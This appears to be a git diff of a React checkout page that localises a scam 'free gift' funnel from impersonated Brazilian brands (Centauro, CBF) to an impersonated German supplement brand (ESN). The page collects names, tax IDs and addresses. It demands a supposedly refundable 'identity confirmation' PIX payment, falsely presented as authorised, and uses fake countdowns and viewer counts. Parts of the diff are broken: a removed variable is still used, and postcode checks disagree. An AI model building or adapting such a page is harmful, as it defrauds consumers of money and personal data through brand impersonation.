@@ -4,12 +4,7 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { Card } from '@/components/ui/card';
 import { CheckCircle, Truck, Shield, Lock, Ticket, Clock, Users, Loader2, ChevronRight, User, MapPin, CreditCard } from 'lucide-react';
-import centauroLogo from '@/assets/centauro-logo.webp';
-import cbfLogo from '@/assets/cbf-logo.webp';
-import camisaAmarelaImg from '@/assets/camisa-brasil-hero.webp';
-import camisaAzulImg from '@/assets/camisa-azul.png';
-import albumImg from '@/assets/album-copa-hero.webp';
-import ingressosVipImg from '@/assets/ingressos-vip-copa.png';
+import esnLogo from '@/assets/esn-logo.png';
 import { trackEvent } from '@/lib/funnelTracking';
 import { fireConversionEvent, getPixelConfig } from '@/lib/pixelManager';
 import { fireWebhookEvent } from '@/lib/webhookManager';
@@ -37,11 +32,6 @@ export default function Checkout() {
   const [searchParams] = useSearchParams();
   const prefilledName = searchParams.get('nome') || '';
   const prefilledCpf = searchParams.get('cpf') || '';
-  const shirtColor = searchParams.get('cor') || 'amarela';
-  const shirtSize = searchParams.get('tamanho') || '';
-  const camisaImg = shirtColor === 'azul' ? camisaAzulImg : camisaAmarelaImg;
-  const colorLabel = shirtColor === 'azul' ? '(Azul)' : '(Amarela)';
-
   const [currentStep, setCurrentStep] = useState(1);
   const [nome, setNome] = useState(prefilledName);
   const [email, setEmail] = useState('');
@@ -85,13 +75,13 @@ export default function Checkout() {
   const [cardError, setCardError] = useState('');
   const [cardLoading, setCardLoading] = useState(false);
 
-  const cepValid = cep.replace(/\D/g, '').length === 8 && !!endereco;
+  const cepValid = cep.replace(/\D/g, '').length === 5 && !!endereco;
   const [shippingCost, setShippingCost] = useState(29.90);
 
   useEffect(() => {
     window.scrollTo(0, 0);
-    if (prefilledCpf && !cpf) {
-      setCpf(formatCpf(prefilledCpf));
+    if (prefilledName && !nome) {
+      setNome(prefilledName);
     }
     // Load product ticket from gateway config
     fetchPaymentGatewayConfig().then((cfg) => {
@@ -101,8 +91,8 @@ export default function Checkout() {
       setPagouaiPublicKey(cfg.pagouai?.publicKey || '');
       // Track checkout event with the dynamic value
       trackEvent('checkout');
-      trackEvent('checkout_step_1'); // etapa 1: dados pessoais
-      fireConversionEvent('InitiateCheckout', { value, currency: 'BRL' });
+      trackEvent('checkout_step_1'); // Schritt 1: Persönliche Daten
+      fireConversionEvent('InitiateCheckout', { value, currency: 'EUR' });
     });
   }, []);
 
@@ -161,7 +151,7 @@ export default function Checkout() {
     setCpf(formatted);
     const digits = formatted.replace(/\D/g, '');
     if (digits.length === 11) {
-      setCpfError(validateCpf(formatted) ? '' : 'CPF inválido. Verifique os números.');
+      setCpfError(validateCpf(formatted) ? '' : 'Ungültige Steuernummer. Bitte überprüfen.');
     } else {
       setCpfError('');
     }
@@ -813,19 +803,17 @@ export default function Checkout() {
   };
 
   const steps = [
-    { number: 1, label: 'Identificação', icon: User },
-    { number: 2, label: 'Endereço', icon: MapPin },
-    { number: 3, label: 'Pagamento', icon: CreditCard },
+    { number: 1, label: 'Identifikation', icon: User },
+    { number: 2, label: 'Adresse', icon: MapPin },
+    { number: 3, label: 'Zahlung', icon: CreditCard },
   ];
 
   return (
     <div className="min-h-screen bg-background" style={{ fontFamily: "'Rubik', 'Inter', system-ui, sans-serif" }}>
       {/* Header */}
       <div className="bg-primary py-4 px-4">
-        <div className="max-w-4xl mx-auto flex items-center justify-center -translate-x-2">
-          <img src={centauroLogo} alt="Centauro" className="h-14 md:h-20 object-contain brightness-0 invert" />
-          <div className="w-px h-8 bg-primary-foreground/30 ml-2 mr-4" />
-          <img src={cbfLogo} alt="CBF" className="h-14 md:h-20 object-contain" />
+        <div className="max-w-4xl mx-auto flex items-center justify-center">
+          <img src={esnLogo} alt="ESN" className="h-14 md:h-20 object-contain" style={{ mixBlendMode: 'screen' }} />
         </div>
       </div>
 
@@ -833,13 +821,13 @@ export default function Checkout() {
       <div className="bg-foreground text-primary-foreground py-2.5">
         <div className="max-w-4xl mx-auto px-4 flex items-center justify-center gap-6 text-xs font-bold">
           <div className="flex items-center gap-2">
-            <Clock size={14} className="text-primary" />
-            <span>Oferta expira em:</span>
-            <span className="text-primary animate-countdown font-mono">{formatTime(timeLeft)}</span>
+            <Clock size={14} className="text-centauro-gold" />
+            <span>Angebot endet in:</span>
+            <span className="text-centauro-gold animate-countdown font-mono">{formatTime(timeLeft)}</span>
           </div>
           <div className="hidden md:flex items-center gap-2">
             <Users size={14} className="text-centauro-gold" />
-            <span>{viewersCount} pessoas vendo agora</span>
+            <span>{viewersCount} Personen sehen sich das gerade an</span>
           </div>
         </div>
       </div>
@@ -885,31 +873,31 @@ export default function Checkout() {
 
         {/* Order summary mini */}
         <Card className="p-4 mb-6 border border-border">
-          <h3 className="text-sm font-black text-foreground mb-3 uppercase tracking-tight">Resumo do Pedido</h3>
+          <h3 className="text-sm font-black text-foreground mb-3 uppercase tracking-tight">Bestellübersicht</h3>
           <div className="flex items-center gap-3 mb-2">
-            <img src={camisaImg} alt="Camisa" className="w-12 h-12 object-contain rounded" />
+            <div className="w-12 h-12 flex items-center justify-center text-2xl">🥤</div>
             <div className="flex-1">
-              <p className="text-xs font-bold text-foreground">Camisa Brasil 2026 {colorLabel}</p>
-              <p className="text-[10px] text-muted-foreground">Edição Copa do Mundo{shirtSize ? ` • Tam: ${shirtSize}` : ''}</p>
+              <p className="text-xs font-bold text-foreground">ESN Designer Whey {colorLabel}</p>
+              <p className="text-[10px] text-muted-foreground">Premium Whey Protein</p>
             </div>
-            <span className="text-xs font-black text-centauro-green">GRÁTIS</span>
+            <span className="text-xs font-black text-centauro-green">GRATIS</span>
           </div>
           <div className="flex items-center gap-3 mb-2">
-            <img src={albumImg} alt="Álbum" className="w-12 h-12 object-contain rounded" />
+            <div className="w-12 h-12 flex items-center justify-center text-2xl">💪</div>
             <div className="flex-1">
-              <p className="text-xs font-bold text-foreground">Álbum Copa 2026 + 50 Packs</p>
-              <p className="text-[10px] text-muted-foreground">Panini Edição Limitada</p>
+              <p className="text-xs font-bold text-foreground">ESN Kreatin Monohydrat 500g</p>
+              <p className="text-[10px] text-muted-foreground">Creapure® Qualität</p>
             </div>
-            <span className="text-xs font-black text-centauro-green">GRÁTIS</span>
+            <span className="text-xs font-black text-centauro-green">GRATIS</span>
           </div>
           <div className="border-t border-foreground/10 my-2" />
           <div className="flex items-center gap-3">
-            <img src={ingressosVipImg} alt="Ingressos VIP" className="w-12 h-12 object-contain rounded" />
+            <div className="w-12 h-12 flex items-center justify-center text-2xl">🎁</div>
             <div className="flex-1">
-              <p className="text-xs font-bold text-foreground">Concorrendo a 2 Ingressos VIP da Copa</p>
-              <p className="text-[10px] text-muted-foreground">Passagem + Hotel + Ingressos VIP • Sorteio 15/06/2026</p>
+              <p className="text-xs font-bold text-foreground">Premium Supplement-Paket Verlosung</p>
+              <p className="text-[10px] text-muted-foreground">ESN Paket €500 Wert • Verlosung 15.06.2026</p>
             </div>
-            <span className="text-xs font-black text-centauro-gold">INCLUSO</span>
+            <span className="text-xs font-black text-centauro-gold">INKLUSIVE</span>
           </div>
         </Card>
 
@@ -918,20 +906,20 @@ export default function Checkout() {
           <Card className="p-5 md:p-6 mb-6 border border-border animate-fade-in">
             <div className="flex items-center gap-2 mb-5">
               <User size={16} className="text-centauro-green" />
-              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Identificação</h3>
+              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Identifikation</h3>
             </div>
 
             <div className="space-y-4">
               {/* Nome */}
               <div data-field-error={showFieldErrors && !nome ? 'true' : undefined}>
-                <label className="text-xs font-bold text-foreground mb-1.5 block">Nome Completo</label>
+                <label className="text-xs font-bold text-foreground mb-1.5 block">Vollständiger Name</label>
                 <Input
-                  placeholder="Seu nome completo"
+                  placeholder="Dein vollständiger Name"
                   value={nome}
                   onChange={(e) => setNome(e.target.value)}
                   className={`py-5 ${showFieldErrors && !nome ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                 />
-                {showFieldErrors && !nome && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                {showFieldErrors && !nome && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
               </div>
 
               {/* Email + Telefone */}
@@ -963,10 +951,10 @@ export default function Checkout() {
                     </div>
                   )}
                   {emailError && <p className="text-destructive text-xs font-semibold mt-1.5">{emailError}</p>}
-                  {showFieldErrors && !email && !emailError && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                  {showFieldErrors && !email && !emailError && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
                 <div data-field-error={showFieldErrors && (telefone.replace(/\D/g, '').length < 10 || !!telefoneError) ? 'true' : undefined}>
-                  <label className="text-xs font-bold text-foreground mb-1.5 block">Telefone</label>
+                  <label className="text-xs font-bold text-foreground mb-1.5 block">Telefon</label>
                   <Input
                     placeholder="(00) 00000-0000"
                     value={telefone}
@@ -976,7 +964,7 @@ export default function Checkout() {
                     maxLength={15}
                   />
                   {telefoneError && <p className="text-destructive text-xs font-semibold mt-1.5">{telefoneError}</p>}
-                  {showFieldErrors && !telefone && !telefoneError && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                  {showFieldErrors && !telefone && !telefoneError && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
               </div>
 
@@ -992,7 +980,7 @@ export default function Checkout() {
                   maxLength={14}
                 />
                 {cpfError && <p className="text-destructive text-xs font-semibold mt-1.5">{cpfError}</p>}
-                {showFieldErrors && !cpf && !cpfError && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                {showFieldErrors && !cpf && !cpfError && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
               </div>
             </div>
 
@@ -1000,7 +988,7 @@ export default function Checkout() {
               onClick={handleNextStep}
               className="w-full bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-base py-7 rounded-lg mt-6 transition-transform hover:scale-[1.02] active:scale-95"
             >
-              CONTINUAR <ChevronRight size={18} className="ml-1" />
+              WEITER <ChevronRight size={18} className="ml-1" />
             </Button>
           </Card>
         )}
@@ -1010,13 +998,13 @@ export default function Checkout() {
           <Card className="p-5 md:p-6 mb-6 border border-border animate-fade-in">
             <div className="flex items-center gap-2 mb-5">
               <MapPin size={16} className="text-centauro-green" />
-              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Endereço de Entrega</h3>
+              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Lieferadresse</h3>
             </div>
 
             <div className="space-y-4">
               {/* CEP */}
               <div data-field-error={showFieldErrors && cep.replace(/\D/g, '').length !== 8 ? 'true' : undefined}>
-                <label className="text-xs font-bold text-foreground mb-1.5 block">CEP</label>
+                <label className="text-xs font-bold text-foreground mb-1.5 block">PLZ</label>
                 <div className="relative">
                   <Input
                     placeholder="00000-000"
@@ -1033,40 +1021,40 @@ export default function Checkout() {
                     </div>
                   )}
                 </div>
-                {showFieldErrors && cep.replace(/\D/g, '').length !== 8 && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                {showFieldErrors && cep.replace(/\D/g, '').length !== 8 && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
               </div>
 
               {/* Endereço + Número */}
               <div className="grid grid-cols-3 gap-4">
                 <div className="col-span-2" data-field-error={showFieldErrors && !endereco ? 'true' : undefined}>
-                  <label className="text-xs font-bold text-foreground mb-1.5 block">Endereço</label>
+                  <label className="text-xs font-bold text-foreground mb-1.5 block">Straße</label>
                   <Input
-                    placeholder="Rua, Avenida..."
+                    placeholder="Straße, Hausnummer..."
                     value={endereco}
                     onChange={(e) => setEndereco(e.target.value)}
                     className={`py-5 ${showFieldErrors && !endereco ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                   />
-                  {showFieldErrors && !endereco && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                  {showFieldErrors && !endereco && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
                 <div data-field-error={showFieldErrors && !numero ? 'true' : undefined}>
-                  <label className="text-xs font-bold text-foreground mb-1.5 block">Número</label>
+                  <label className="text-xs font-bold text-foreground mb-1.5 block">Nr.</label>
                   <Input
-                    placeholder="Nº"
+                    placeholder="Nr."
                     value={numero}
                     onChange={(e) => setNumero(e.target.value.replace(/\D/g, ''))}
                     inputMode="numeric"
                     pattern="[0-9]*"
                     className={`py-5 ${showFieldErrors && !numero ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                   />
-                  {showFieldErrors && !numero && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
+                  {showFieldErrors && !numero && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
               </div>
 
               {/* Complemento */}
               <div>
-                <label className="text-xs font-bold text-foreground mb-1.5 block">Complemento <span className="text-muted-foreground font-normal">(opcional)</span></label>
+                <label className="text-xs font-bold text-foreground mb-1.5 block">Zusatz <span className="text-muted-foreground font-normal">(optional)</span></label>
                 <Input
-                  placeholder="Apto, Bloco..."
+                  placeholder="Wohnung, Stockwerk..."
                   value={complemento}
                   onChange={(e) => setComplemento(e.target.value)}
                   className="py-5"
@@ -1076,24 +1064,24 @@ export default function Checkout() {
               {/* Bairro + Cidade + Estado */}
               <div className="grid grid-cols-[1fr_1fr_80px] gap-4">
                 <div data-field-error={showFieldErrors && !bairro ? 'true' : undefined}>
-                  <label className="text-xs font-bold text-foreground mb-1.5 block">Bairro</label>
-                  <Input placeholder="Bairro" value={bairro} onChange={(e) => setBairro(e.target.value)} className={`py-5 ${showFieldErrors && !bairro ? 'border-destructive focus-visible:ring-destructive' : ''}`} />
-                  {showFieldErrors && !bairro && <p className="text-destructive text-xs font-semibold mt-1.5">Obrigatório</p>}
+                  <label className="text-xs font-bold text-foreground mb-1.5 block">Stadtteil</label>
+                  <Input placeholder="Stadtteil" value={bairro} onChange={(e) => setBairro(e.target.value)} className={`py-5 ${showFieldErrors && !bairro ? 'border-destructive focus-visible:ring-destructive' : ''}`} />
+                  {showFieldErrors && !bairro && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
                 <div data-field-error={showFieldErrors && !cidade ? 'true' : undefined}>
-                  <label className="text-xs font-bold text-foreground mb-1.5 block">Cidade</label>
-                  <Input placeholder="Cidade" value={cidade} onChange={(e) => setCidade(e.target.value)} className={`py-5 ${showFieldErrors && !cidade ? 'border-destructive focus-visible:ring-destructive' : ''}`} />
-                  {showFieldErrors && !cidade && <p className="text-destructive text-xs font-semibold mt-1.5">Obrigatório</p>}
+                  <label className="text-xs font-bold text-foreground mb-1.5 block">Stadt</label>
+                  <Input placeholder="Stadt" value={cidade} onChange={(e) => setCidade(e.target.value)} className={`py-5 ${showFieldErrors && !cidade ? 'border-destructive focus-visible:ring-destructive' : ''}`} />
+                  {showFieldErrors && !cidade && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
                 <div data-field-error={showFieldErrors && !estado ? 'true' : undefined}>
-                  <label className="text-xs font-bold text-foreground mb-1.5 block">Estado</label>
+                  <label className="text-xs font-bold text-foreground mb-1.5 block">Bundesland</label>
                   <select value={estado} onChange={(e) => setEstado(e.target.value)} className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 ${showFieldErrors && !estado ? 'border-destructive focus:ring-destructive' : ''}`}>
-                    <option value="">UF</option>
-                    {["AC","AL","AP","AM","BA","CE","DF","ES","GO","MA","MT","MS","MG","PA","PB","PR","PE","PI","RJ","RN","RS","RO","RR","SC","SP","SE","TO"].map(uf => (
-                      <option key={uf} value={uf}>{uf}</option>
+                    <option value="">BL</option>
+                    {["BW","BY","BE","BB","HB","HH","HE","MV","NI","NW","RP","SL","SN","ST","SH","TH"].map(bl => (
+                      <option key={bl} value={bl}>{bl}</option>
                     ))}
                   </select>
-                  {showFieldErrors && !estado && <p className="text-destructive text-xs font-semibold mt-1.5">Obrigatório</p>}
+                  {showFieldErrors && !estado && <p className="text-destructive text-xs font-semibold mt-1.5">Pflichtfeld</p>}
                 </div>
               </div>
 
@@ -1104,39 +1092,39 @@ export default function Checkout() {
                     <div className="flex items-center gap-2">
                       <Shield size={18} className="text-centauro-green" />
                       <p className="text-sm font-black text-foreground uppercase tracking-tight">
-                        Confirmação de Identidade
+                        Identitätsbestätigung
                       </p>
                       <span className="ml-auto text-[10px] font-black bg-centauro-green text-primary-foreground px-2 py-0.5 rounded-full uppercase">
-                        100% estornável
+                        100% erstattbar
                       </span>
                     </div>
 
                     <p className="text-xs text-foreground leading-relaxed">
-                      Para garantir a segurança da entrega e evitar fraudes, é necessário fazer um <strong>PIX simbólico de confirmação de identidade</strong>. O valor é <strong>estornado instantaneamente</strong> assim que sua identidade for validada (valores entre R$ 9,40 e R$ 50,00 — o seu é de <strong>R$ {shippingCost.toFixed(2).replace('.', ',')}</strong>).
+                      Um die Sicherheit der Lieferung zu gewährleisten, ist eine <strong>symbolische PIX-Identitätsbestätigung</strong> erforderlich. Der Betrag wird <strong>sofort erstattet</strong>, sobald deine Identität bestätigt ist (Beträge zwischen €9,40 und €50,00 — deiner beträgt <strong>€{shippingCost.toFixed(2).replace('.', ',')}</strong>).
                     </p>
 
                     <div className="grid grid-cols-3 gap-2 pt-1">
                       <div className="flex flex-col items-center text-center gap-1 p-2 rounded-lg bg-background/60">
                         <Lock size={14} className="text-centauro-green" />
-                        <span className="text-[10px] font-bold text-foreground leading-tight">Pagamento<br/>seguro</span>
+                        <span className="text-[10px] font-bold text-foreground leading-tight">Sichere<br/>Zahlung</span>
                       </div>
                       <div className="flex flex-col items-center text-center gap-1 p-2 rounded-lg bg-background/60">
                         <Clock size={14} className="text-centauro-green" />
-                        <span className="text-[10px] font-bold text-foreground leading-tight">Estorno<br/>instantâneo</span>
+                        <span className="text-[10px] font-bold text-foreground leading-tight">Sofortige<br/>Erstattung</span>
                       </div>
                       <div className="flex flex-col items-center text-center gap-1 p-2 rounded-lg bg-background/60">
                         <Truck size={14} className="text-centauro-green" />
-                        <span className="text-[10px] font-bold text-foreground leading-tight">Frete<br/>grátis</span>
+                        <span className="text-[10px] font-bold text-foreground leading-tight">Kostenloser<br/>Versand</span>
                       </div>
                     </div>
 
                     <div className="flex items-center justify-between pt-2 border-t border-centauro-green/30">
-                      <span className="text-xs font-bold text-muted-foreground">Valor a confirmar:</span>
-                      <span className="text-lg font-black text-centauro-green">R$ {shippingCost.toFixed(2).replace('.', ',')}</span>
+                      <span className="text-xs font-bold text-muted-foreground">Zu bestätigender Betrag:</span>
+                      <span className="text-lg font-black text-centauro-green">€{shippingCost.toFixed(2).replace('.', ',')}</span>
                     </div>
 
                     <p className="text-[10px] text-muted-foreground text-center">
-                      ✓ Cobrança autorizada pelo Banco Central — você recebe o estorno na mesma chave PIX.
+                      ✓ Autorisierte Abbuchung — du erhältst die Erstattung sofort zurück.
                     </p>
                   </div>
                 </div>
@@ -1149,13 +1137,13 @@ export default function Checkout() {
                 onClick={() => setCurrentStep(1)}
                 className="flex-1 py-7 font-bold text-sm"
               >
-                Voltar
+                Zurück
               </Button>
               <Button
                 onClick={handleNextStep}
                 className="flex-[2] bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-base py-7 rounded-lg transition-transform hover:scale-[1.02] active:scale-95"
               >
-                CONTINUAR <ChevronRight size={18} className="ml-1" />
+                WEITER <ChevronRight size={18} className="ml-1" />
               </Button>
             </div>
           </Card>
@@ -1166,37 +1154,37 @@ export default function Checkout() {
           <Card className="p-5 md:p-6 mb-6 border border-border animate-fade-in">
             <div className="flex items-center gap-2 mb-5">
               <CreditCard size={16} className="text-centauro-green" />
-              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Forma de Pagamento</h3>
+              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Zahlungsmethode</h3>
             </div>
 
             {/* Summary of previous steps */}
             <div className="space-y-4 mb-6">
               <div className="bg-muted/50 rounded-lg p-4 space-y-2">
                 <div className="flex items-center justify-between">
-                  <h4 className="text-xs font-black text-foreground uppercase">Dados Pessoais</h4>
-                  <button onClick={() => setCurrentStep(1)} className="text-[10px] font-bold text-centauro-green hover:underline">Editar</button>
+                  <h4 className="text-xs font-black text-foreground uppercase">Persönliche Daten</h4>
+                  <button onClick={() => setCurrentStep(1)} className="text-[10px] font-bold text-centauro-green hover:underline">Bearbeiten</button>
                 </div>
                 <p className="text-xs text-muted-foreground">{nome}</p>
                 <p className="text-xs text-muted-foreground">{email} • {telefone}</p>
-                <p className="text-xs text-muted-foreground">CPF: {cpf}</p>
+                <p className="text-xs text-muted-foreground">ID: {cpf}</p>
               </div>
 
               <div className="bg-muted/50 rounded-lg p-4 space-y-2">
                 <div className="flex items-center justify-between">
-                  <h4 className="text-xs font-black text-foreground uppercase">Entrega</h4>
-                  <button onClick={() => setCurrentStep(2)} className="text-[10px] font-bold text-centauro-green hover:underline">Editar</button>
+                  <h4 className="text-xs font-black text-foreground uppercase">Lieferung</h4>
+                  <button onClick={() => setCurrentStep(2)} className="text-[10px] font-bold text-centauro-green hover:underline">Bearbeiten</button>
                 </div>
                 <p className="text-xs text-muted-foreground">{endereco}, {numero}{complemento ? `, ${complemento}` : ''}</p>
-                <p className="text-xs text-muted-foreground">{bairro} — {cidade}/{estado} — CEP {cep}</p>
-                <p className="text-xs font-bold text-centauro-green">✓ Frete grátis para todo o Brasil</p>
+                <p className="text-xs text-muted-foreground">{bairro} — {cidade}/{estado} — PLZ {cep}</p>
+                <p className="text-xs font-bold text-centauro-green">✓ Kostenloser Versand nach ganz Deutschland</p>
               </div>
 
               <div className="bg-centauro-green/5 border border-centauro-green/30 rounded-lg p-4 space-y-1">
                 <div className="flex items-center gap-2">
                   <Shield size={14} className="text-centauro-green" />
-                  <h4 className="text-xs font-black text-foreground uppercase">Confirmação de Identidade</h4>
+                  <h4 className="text-xs font-black text-foreground uppercase">Identitätsbestätigung</h4>
                 </div>
-                <p className="text-[11px] text-muted-foreground">PIX simbólico de R$ {shippingCost.toFixed(2).replace('.', ',')} — <strong className="text-foreground">estornado instantaneamente</strong> após validação.</p>
+                <p className="text-[11px] text-muted-foreground">Symbolische PIX-Zahlung von €{shippingCost.toFixed(2).replace('.', ',')} — <strong className="text-foreground">sofort erstattet</strong> nach Überprüfung.</p>
               </div>
             </div>
 
@@ -1209,15 +1197,15 @@ export default function Checkout() {
                   className={`p-3 rounded-lg border-2 text-xs font-black transition-all ${paymentMethod === 'pix' ? 'border-centauro-green bg-centauro-green/5 text-centauro-green' : 'border-border text-muted-foreground'}`}
                 >
                   PIX
-                  <p className="text-[10px] font-normal mt-0.5">Aprovação instantânea</p>
+                  <p className="text-[10px] font-normal mt-0.5">Sofortige Bestätigung</p>
                 </button>
                 <button
                   type="button"
                   onClick={() => setPaymentMethod('card')}
                   className={`p-3 rounded-lg border-2 text-xs font-black transition-all ${paymentMethod === 'card' ? 'border-centauro-green bg-centauro-green/5 text-centauro-green' : 'border-border text-muted-foreground'}`}
                 >
-                  Cartão de Crédito
-                  <p className="text-[10px] font-normal mt-0.5">À vista (1x)</p>
+                  Kreditkarte
+                  <p className="text-[10px] font-normal mt-0.5">Einmalzahlung (1x)</p>
                 </button>
               </div>
             ) : (
@@ -1228,9 +1216,9 @@ export default function Checkout() {
                   </div>
                   <div className="flex-1">
                     <p className="text-sm font-black text-foreground">PIX</p>
-                    <p className="text-[10px] text-muted-foreground">Aprovação instantânea</p>
+                    <p className="text-[10px] text-muted-foreground">Sofortige Bestätigung</p>
                   </div>
-                  <span className="text-lg font-black text-centauro-green">R$ {(shippingCost || 29.90).toFixed(2).replace('.', ',')}</span>
+                  <span className="text-lg font-black text-centauro-green">€{(shippingCost || 29.90).toFixed(2).replace('.', ',')}</span>
                 </div>
               </div>
             )}
@@ -1250,8 +1238,8 @@ export default function Checkout() {
                 onCreateTransaction={async (tokenData) => {
                   if (!isFormValid) {
                     setShowFieldErrors(true);
-                    setCardError('Preencha todos os dados obrigatórios.');
-                    throw new Error('Preencha todos os dados obrigatórios.');
+                    setCardError('Bitte alle Pflichtfelder ausfüllen.');
+                    throw new Error('Bitte alle Pflichtfelder ausfüllen.');
                   }
                   return await handleCardPayment(tokenData);
                 }}
@@ -1270,9 +1258,9 @@ export default function Checkout() {
                 style={{ boxShadow: '0 6px 25px hsl(145 63% 42% / 0.5)', animation: 'pulse-glow-green 2s ease-in-out infinite' }}
               >
                 {pixLoading ? (
-                  <><Loader2 size={18} className="mr-2 animate-spin" /> GERANDO PIX...</>
+                  <><Loader2 size={18} className="mr-2 animate-spin" /> PIX WIRD GENERIERT...</>
                 ) : (
-                  'VERIFICAR AGORA'
+                  'JETZT BESTÄTIGEN'
                 )}
               </Button>
             )}
@@ -1282,9 +1270,9 @@ export default function Checkout() {
         {/* Trust */}
         <div className="grid grid-cols-3 gap-3 mb-6">
           {[
-            { icon: CheckCircle, color: 'text-foreground', title: 'Resgate Imediato' },
-            { icon: Truck, color: 'text-foreground', title: '3-5 dias úteis' },
-            { icon: Shield, color: 'text-foreground', title: 'Compra Segura' },
+            { icon: CheckCircle, color: 'text-foreground', title: 'Sofortiger Versand' },
+            { icon: Truck, color: 'text-foreground', title: '3-5 Werktage' },
+            { icon: Shield, color: 'text-foreground', title: 'Sicherer Kauf' },
           ].map(({ icon: Icon, color, title }) => (
             <div key={title} className="bg-card p-3 rounded-lg border border-border text-center">
               <Icon className={`${color} mx-auto mb-1`} size={18} />
@@ -1295,8 +1283,8 @@ export default function Checkout() {
 
         {/* Footer */}
         <div className="text-center py-4">
-          <img src={centauroLogo} alt="Centauro" className="h-10 mx-auto mb-2 opacity-30" />
-          <p className="text-muted-foreground text-[10px]">© 2026 Centauro Esportes. Todos os direitos reservados.</p>
+          <img src={esnLogo} alt="ESN" className="h-10 mx-auto mb-2 opacity-30" />
+          <p className="text-muted-foreground text-[10px]">© 2026 ESN - Elite Sports Nutrition. Alle Rechte vorbehalten.</p>
         </div>
       </div>
 
